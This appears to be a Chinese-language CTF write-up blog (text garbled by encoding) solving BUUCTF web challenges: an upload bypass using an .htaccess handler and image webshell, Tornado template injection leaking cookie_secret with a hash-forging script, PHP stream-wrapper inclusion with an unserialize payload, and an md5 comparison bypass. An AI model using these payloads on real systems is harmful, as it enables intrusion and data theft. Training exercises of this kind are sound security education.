# [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

åŒå†™å¤§å°å†™ç»•è¿‡

åç¼€ç»•è¿‡ï¼šç©ºæ ¼ ç‚¹ %00  

æ‰©å±•åç»•è¿‡: php3 php5 phtml php5 shtml pwml phtm 

ä»¥ä¸Šæ¯ä¸ªç±»å‹è¯•ä¸€ä¸‹ï¼ŒæŠ“åŒ…çœ‹phpç‰ˆæœ¬å›æ˜¾ 5.6 å¯è§ä¸æ˜¯ä¸Šé¢çš„æ–¹å¼ å›¾ç‰‡é©¬

.hatccess 

```
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

å›¾ç‰‡é©¬å‘½ä»¤

```
copy  1.jpg/b + 1.php/a 2.jpg
```

**![image-20241210163529566](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210163529165-1511214938.png)**

# [æŠ¤ç½‘æ¯ 2018]easy_tornado

### ![image-20241210164401941](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210164401498-1863589484.png)

![image-20241210164410873](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210164410107-1052545020.png)

md5(cookie+md5(/fllllllllllllag))

3bf9f6cf685a6dd8defadabfb41a03a1

æ¬¸ æˆ‘ä¸çŸ¥é“cookie_secretåœ¨å“ªé‡Œå•Š o tornadoåŸæ¥æ˜¯ä¸€ä¸ªæ¨¡æ¿ æ¨¡æ¿æ³¨å…¥STTIè·å–cookie

renderæ˜¯pythonçš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•° ä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ é€šè¿‡è°ƒç”¨çš„å‡½æ•°ä¸åŒå»ç”Ÿæˆä¸åŒçš„ç½‘é¡µé…åˆTornadoä½¿ç”¨

tornadoæ˜¯ä¸€ç§webæœåŠ¡å™¨è½¯ä»¶çš„å¼€æºç‰ˆæœ¬ å’Œä¸»æµçš„webæ¡†æ¶ æœ‰æ˜æ˜¾åŒºåˆ« æ˜¯éé˜»å¡æœåŠ¡å™¨ é€Ÿåº¦ç›¸å½“å¿«

è¿™é‡Œé€šè¿‡æ¨¡æ¿ä¸­çš„å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œæœ‰äº›è®¿é—®å¯¹è±¡ä¼šæŒ‡å‘cookie cookieåº”è¯¥æ‰¾å’Œhandlerç›¸å…³çš„

æœç´¢tornado cookie_secretæ³„éœ² tornado cookie å®‰å…¨

æ¯”èµ›çš„æ—¶å€™æˆ‘è§‰å¾—æˆ‘åšä¸å‡ºè¿™ä¸ªé¢˜ç›® è¿™ä¸¤ä¸ªæ–‡ç« è¦é’± æˆ‘æ²¡å¾—çœ‹ 

## PYTHON SSTI

å¸¸è§çš„æ¨¡æ¿æœ‰ï¼šjinja2ã€tornado

## tornadoæ¨¡æ¿

tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡{{}}è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚

## è¿™é¢˜æ˜¯ tornado renderæ¨¡æ¿æ³¨å…¥

md5(cookie+md5(/fllllllllllllag))

æœç´¢æ€è·¯çš„æ—¶å€™åº”è¯¥å½¢å®¹çš„å‡†ç¡®ä¸€ç‚¹ å®é™…ä¸Šè¿™é¢˜æ˜¯python ssti tornado renderæ¨¡æ¿æ³¨å…¥

[python SSTI tornado renderæ¨¡æ¿æ³¨å…¥ - HanamizukièŠ±æ°´æœ¨ - åšå®¢å›­](https://www.cnblogs.com/cimuhuashuimu/p/11544455.html)

[HanamizukièŠ±æ°´æœ¨](https://www.cnblogs.com/cimuhuashuimu)

## [python SSTI tornado renderæ¨¡æ¿æ³¨å…¥](https://www.cnblogs.com/cimuhuashuimu/p/11544455.html)

**åŸç†**
tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡{{}}è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚

```python
import tornado.ioloop
import tornado.web
 
class MainHandler(tornado.web.RequestHandler):
  def get(self):
    self.render('index.html')    
class LoginHandler(BaseHandler):
  def get(self):
    '''
    å½“ç”¨æˆ·è®¿ç™»å½•çš„æ—¶å€™æˆ‘ä»¬å°±å¾—ç»™ä»–å†™cookieäº†,ä½†æ˜¯è¿™é‡Œæ²¡æœ‰å†™åœ¨å“ªé‡Œå†™äº†å‘¢?
    åœ¨å“ªé‡Œå‘¢?ä¹‹å‰å†™çš„Handleréƒ½æ˜¯ç»§æ‰¿çš„RequestHandler,è¿™æ¬¡ç»§æ‰¿çš„æ˜¯BaseHandleræ˜¯è‡ªå·±å†™çš„Handler
    ç»§æ‰¿è‡ªå·±çš„ç±»,åœ¨ç±»äº†åŠ æ‰©å±•initialize! åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œåšè·å–ç”¨æˆ·cookieæˆ–è€…å†™cookieéƒ½å¯ä»¥åœ¨è¿™é‡Œåš
    '''
    '''
    æˆ‘ä»¬çŸ¥é“LoginHandlerå¯¹è±¡å°±æ˜¯self,æˆ‘ä»¬å¯ä¸å¯ä»¥self.set_cookie()å¯ä¸å¯ä»¥self.get_cookie()
    '''
    \# self.set_cookie()
    \# self.get_cookie()
    self.render('login.html', **{'status': ''})
def login(request):
  \#è·å–ç”¨æˆ·è¾“å…¥
  login_form = AccountForm.LoginForm(request.POST)
  if request.method == 'POST':
    \#åˆ¤æ–­ç”¨æˆ·è¾“å…¥æ˜¯å¦åˆæ³•
    if login_form.is_valid():#å¦‚æœç”¨æˆ·è¾“å…¥æ˜¯åˆæ³•çš„
      username = request.POST.get('username')
      password = request.POST.get('password')
      if models.UserInfo.objects.get(username=username) and models.UserInfo.objects.get(username=username).password == password:
          request.session['auth_user'] = username
          return redirect('/index/')
      else:
        return render(request,'account/login.html',{'model': login_form,'backend_autherror':'ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯'})
    else:
      error_msg = login_form.errors.as_data()
      return render(request,'account/login.html',{'model': login_form,'errors':error_msg})
  \# å¦‚æœç™»å½•æˆåŠŸï¼Œå†™å…¥sessionï¼Œè·³è½¬index
  return render(request, 'account/login.html', {'model': login_form}

```

åº”è¯¥æ˜¯éœ€è¦é˜…è¯»è¿™ä¸ªæ¡†æ¶çš„æºç  ç„¶åæ‰¾åˆ°cookie_secretçš„å­˜æ”¾ä½ç½® çŸ¥é“å­˜æ”¾ä½ç½®å½’å±äºå“ªä¸ªç±» å¦‚ä½•è°ƒç”¨ æ»¡è¶³ä»€ä¹ˆæ¡ä»¶

![image-20241210174914533](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210174914520-587386018.png)

```
http://220.249.52.134:32855/error?msg={{handler.request}}


HTTPServerRequest(protocol='http',host='220.249.52.134:32855', method='GET', uri='/error?msg={{handler.request}}',version='HTTP/1.1', remote_ip='xx.xx.xxx.xxx')
```

## è¿™é¢˜çš„å…³é”®è§£æ³•æ€è·¯

```
1 æœç´¢èµ„æ–™çš„æ—¶å€™å…ˆå¼„æ˜ç™½é¢˜ç›®çš„å½’å±ç±»å‹ æ˜¯ä»€ä¹ˆæ¼æ´ æ˜¯ä»€ä¹ˆæ¡†æ¶ ç›®å‰æ˜¯æ¡†æ¶çš„é‚£ä¸€éƒ¨åˆ†é‡ç‚¹å¯æ”»å‡»

2 é˜…è¯»æ¡†æ¶çš„å®˜æ–¹æ–‡æ¡£ ææ˜ç™½ç›®å‰çš„æ¨¡å—å½’å±ï¼Œè°ƒç”¨æ–¹æ³•ï¼Œå¯åˆ©ç”¨ç‚¹

3 ä¸‹è½½tornadoæ¡†æ¶çš„æºä»£ç  ctrl shift f å…¨å±€æœç´¢cookie_secret
```

æ¡†æ¶ä¸­è¯´æ˜ï¼Œè¿˜éœ€è¦å¾—åˆ°Applicationä¸ºè¯·æ±‚æä¾›æœåŠ¡çš„ä¸œä¸œ

RequestHandler.application

å…·ä½“è¿™ä¸ªæ¨¡æ¿æ³¨å…¥è¿‡æ»¤äº†ä»€ä¹ˆä¸œè¥¿å¾—fuzz æ²™ç›’é€ƒé€¸ 

![æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°](https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png)

å…¨å±€æœç´¢å‡ºæ¥è¿™ä¸ªcookie_secretçš„è·å–æ–¹å¼äº† æ˜¯ä¸€ä¸ªhandler.application.settings

![æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°](https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png)

å®˜æ–¹æ–‡æ¡£ä¸­è¯´æ˜è¿™ä¸ªå˜é‡çš„åˆ«åæ˜¯RequestHandler.settings

![æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°](https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png)

è¿™é‡Œå¿…è¦ä½¿ç”¨applicationæ¥ä½œä¸ºè¯·æ±‚æœåŠ¡çš„å¯¹è±¡ï¼Œæ‰èƒ½ä½¿ç”¨handler.application.settingæ¥è·å–cookieï¼Œè¿™é‡Œé€šè¿‡æ‰¾åˆ°åˆ«åæ¥è·å¾—cookieï¼Œè¿™æ ·å°±ä¸ç”¨å†å»æ‰¾applicationäº†ï¼Œä¸Šé¢çš„å›¾ç‰‡æ˜ç¡®è¯´æ˜ï¼ŒRequestHandlerå¯¹è±¡çš„åˆ«åå°±æ˜¯handlerï¼Œæ‰€ä»¥è¯·æ±‚handler.settings=self.application.settings,è‡³æ­¤æˆ‘å·²ç»è§‰å¾—å´©æºƒäº†ã€‚

åˆ©ç”¨æ–¹å¼/error?msg=

![image-20241210231627959](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210231629190-1365610781.png)

```python
import hashlib
import requests

fliename = '/fllllllllllllag'
cookie = "c0b17ff9-1eb5-4cd9-bfe0-353dce9a7e01"
filename = hashlib.md5(fliename.encode()).hexdigest()
a = cookie + filename
filehash = hashlib.md5(a.encode()).hexdigest()
print(filehash)

url = "http://9c22746a-4428-4833-943a-fa28ed505054.node5.buuoj.cn:81/file?filename=/fllllllllllllag&filehash={}".format(filehash)

response = requests.get(url)

if response.status_code == 200:
    print(response.text)
else:
    print("error:",response.status_code)
```

# [ZJCTF 2019]NiZhuanSiWei

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

1 ä¼ ä¸€ä¸ªæ–‡ä»¶ å†…å®¹ä¸ºæ¡ä»¶å­—ç¬¦ä¸² æ‰èƒ½ç»§ç»­ è¯•è¿‡äº† æ ¹æœ¬ä¸ä¼šecho  

// phpä¼ªåè®®dataæ•°æ®æµè¯»å–

// data://text/plain,xxx

2  ç»•è¿‡ æ–‡ä»¶åŒ…å«useless.php

// php://filter/read=convert.base64-encode/resource=useless.php

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

3 ååºåˆ—åŒ– 

```
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$res = new Flag()
echo serialize($res)
?>  

```

// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  

```
http://e9da7177-8ee3-46c4-b70e-041ff54908af.node5.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

# [MRCTF2020]Ez_bypass

### bypass:

RCEç»•è¿‡

```php
<?php
include 'flag.php';
$flag = 'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';

if (isset($_GET['gg']) && isset($_GET['id'])) {
    $id = $_GET['id'];
    $gg = $_GET['gg'];

    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if (isset($_POST['passwd'])) {
            $passwd = $_POST['passwd'];

            if (!is_numeric($passwd)) {
                if ($passwd == 1234567) {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0');
                } else {
                    echo "can you think twice??";
                }
            } else {
                echo 'You can not get it !';
            }
        } else {
            die('only one way to get the flag');
        }
    } else {
        echo "You are not a real hacker!";
    }
} else {
    die('Please input first');
}
?>
```

![image-20241210235834639](https://img2023.cnblogs.com/blog/2759911/202412/2759911-20241210235835539-795665987.png)

php å¼ºå¼±æ¯”è¾ƒ

# [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

è¿™é¢˜ä¸ä¼š ç¡è§‰äº†

